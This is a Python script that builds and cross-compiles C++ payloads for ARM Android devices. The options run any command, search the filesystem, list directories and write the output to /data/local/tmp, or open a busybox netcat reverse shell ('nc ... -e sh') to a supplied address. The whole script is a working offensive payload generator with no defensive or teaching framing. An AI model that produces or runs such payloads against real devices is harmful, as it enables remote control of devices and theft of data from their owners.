# Created: 1/27/2019
# Description: This file creates and compiles cpp files that have single command functions in mind.
# While similar they do have slight differences that have time saved through this optimization.

import argparse
import os

def main():
    parser = argparse.ArgumentParser(description='Generates payload for desired architecture.')
    parser.add_argument('-p', type=str,  default=None, help='Desired Payload: command', dest='payloadChoice', required=True)
    parser.add_argument('-c', type=str,  default=None, help='Command for a command payload', dest='payloadCommand', required=True)
    parser.add_argument('-a', type=str,  default=None, help='Target architecture: arm', dest='targetArch', required=True)
    parser.add_argument('-o', type=str,  default="execute-command", help='Payload output name', dest='payloadName', required=False)


    args = parser.parse_args()

    # Takes the -c and finds out what specifics need to happen with the command
    if(args.payloadChoice == "command" ):
        build_command_payload(args.payloadCommand)
        compile_payload(args.payloadName, args.targetArch)

    if(args.payloadChoice == "search" ):
        search_command_payload(args.payloadCommand)
        compile_payload(args.payloadName, args.targetArch)
    
    if(args.payloadChoice == "directory"):
        directory_command_payload(args.payloadCommand)
        compile_payload(args.payloadName, args.targetArch)

    if(args.payloadChoice == "netcat"):
        build_netcat_basic(args.payloadCommand)
        compile_payload(args.payloadName, args.targetArch)

    return


def directory_command_payload(payload):
    f = open("payload-templates/execute-command.h", "w")
    #Returns any directory listing and puts it in output.txt
    command = "std::string command=\"ls -d " + payload + " | tee /data/local/tmp/output.txt\";"
    f.write(command)
    f.close()
    return


def search_command_payload(payload):
    f = open("payload-templates/execute-command.h", "w")
    # Searches full linux/android direcorty to locate specified file. Outputs result to output.txt for redundency.
    command  = "std::string command=\"find / -name \'" + payload + "\' | tee /data/local/tmp/output.txt\";"
    f.write(command)
    f.close()
    return



def build_netcat_basic(payloadCommand):
    f = open("payload-templates/execute-command.h", "w")
    #Auto creates a reverse shell from a specified ip and port. This doesn't auto return a file
    ncCommand = "std::string command=\""+"./busybox-arm nc "+ payloadCommand + " -e sh\";" #Netcat address and port

    f.write(ncCommand)
    f.close()
    return


def build_command_payload(payloadCommand):
    f = open("payload-templates/execute-command.h", "w")
    #Any command is run. Outputs of command are put in output.txt
    fullCommand = "std::string command=\"" + payloadCommand + " | tee /data/local/tmp/output.txt\";"  #Command variable to be written

    f.write(fullCommand)  #Writing to execute-command.h
    f.close()
    return


def compile_payload(payloadName, targetArch):
    #Compiles commands with archetecture and a given payload name
    os.system("./bin/" + targetArch + "/bin/arm-linux-androideabi-clang++ -static-libstdc++ payload-templates/execute-command.cpp -o" + payloadName)
    return


if __name__ == "__main__":
    main()